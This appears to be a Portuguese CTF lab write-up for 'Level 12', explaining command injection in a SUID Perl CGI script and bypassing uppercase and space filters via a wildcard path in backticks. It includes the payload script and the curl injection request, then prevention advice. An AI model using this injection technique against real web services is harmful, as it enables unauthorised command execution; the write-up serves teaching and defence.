# 𝕃𝕖𝕧𝕖𝕝 𝟙𝟚

## 🎯 Objetivo
O objetivo deste nível é explorar uma vulnerabilidade de Injeção de Comando em um script CGI Perl, burlando filtros de sanitização de entrada (Regex) que convertem caracteres para maiúsculo e removem espaços.

## 🔍 Análise da Vulnerabilidade
* **Tipo:** _OS Command Injection_ (Injeção de Comando do Sistema Operacional) / _Insecure CGI Script_ / _WAF Bypass_.
* **Arquivo Alvo:** `level12.pl` (Script Perl com SUID rodando como CGI via servidor web na porta 4646).
* **Comportamento:** O script recebe os parâmetros `x` e `y` pela URL. O parâmetro `x` é armazenado na variável `$xx` e passa por dois filtros de sanitização usando Expressões Regulares (Regex):

    1. `$xx =~ tr/a-z/A-Z/;` (Converte toda a string para MAIÚSCULO).
    2. `$xx =~ s/\s.*//;` (Remove o primeiro espaço e tudo o que vier depois dele).

    Após os filtros, o script concatena a variável de forma insegura dentro de crases (que no Perl invocam o shell do sistema):
    ```Perl
    @output = `egrep "^$xx" /tmp/xd 2>&1`;
    ```
    A vulnerabilidade ocorre porque os filtros são insuficientes. Como não podemos passar espaços ou letras minúsculas na URL, criamos um script malicioso no diretório `/tmp/` com um nome totalmente em maiúsculo (ex: `SCRIPT`). Para contornar o fato de que a pasta `tmp` possui letras minúsculas, utilizamos o wildcard do shell `*` (asterisco). O caminho `/*/SCRIPT` sobrevive aos filtros do Perl e é expandido pelo Bash para `/tmp/SCRIPT`.

## 💻 Passos para Exploração (Exploit)

1.  **Reconhecimento e Análise de Código:**
    Identificamos o script `level12.pl` e analisamos o seu código fonte. Descobrimos o serviço rodando na porta `4646` e a injeção na linha do `egrep`.

2.  **Preparação do Payload:**
    Criamos um script na pasta pública `/tmp/` contendo o comando `getflag` e redirecionando a saída para outro arquivo. O nome do arquivo precisa ser totalmente em letras maiúsculas para que o filtro do Perl não o altere se o passarmos na URL.
    Usamos aspas simples para garantir que o Bash grave o comando literalmente, sem executá-lo antecipadamente. E tornamos o nosso payload executável para que o shell do servidor possa rodá-lo.

    ```Bash
    echo 'getflag > /tmp/flag12' > /tmp/SCRIPT
    chmod +x /tmp/SCRIPT
    ```

3.  **Exploração e Coleta de Flag:**
    Usamos o `curl` para enviar uma requisição HTTP ao serviço. No parâmetro `x`, injetamos o caminho do nosso payload usando o wildcard `*` para evitar as letras minúsculas do `/tmp/`. Envolvemos o caminho com crases (`` ` ``) para forçar o bash do servidor a executar o arquivo em vez de tratá-lo apenas como uma string de busca para o `egrep`. E lemos o arquivo gerado na pasta temporária, que contém a saída do comando rodado com privilégios elevados.
    ```bash
    curl 'http://localhost:4646/?x=`/*/SCRIPT`'
    cat /tmp/flag12
    # Saída: Check flag.Here is your token : g1qKMiRpXf53A...
    ```

## 🚩 Solução / Flag
A injeção de comando foi bem-sucedida, contornando a sanitização de uppercase e exfiltrando a flag para o diretório temporário.

## 🛡️ Prevenção (Como corrigir)
1. **Evitar Execução via Shell:** Em Perl, o uso de crases (`` ` ``) ou `system()` com entrada não confiável é crítico. Se a intenção é buscar algo em um arquivo, o script deve abrir o arquivo nativamente com Perl (`open(my $fh, '<', '/tmp/xd')`) e processar linha a linha na memória, sem invocar binários externos do sistema (`egrep`).

2. **Sanitização Rigorosa (Allowlisting):** Se a execução de comandos externos for absolutamente inevitável, a entrada do usuário deve ser validada contra uma lista estrita de caracteres permitidos (ex: apenas letras e números alfanuméricos `^[a-zA-Z0-9]+$`). wildcards (`*`) e delimitadores de shell (`` ` ``, `$()`, `;`, `|`) devem ser rigorosamente bloqueados.
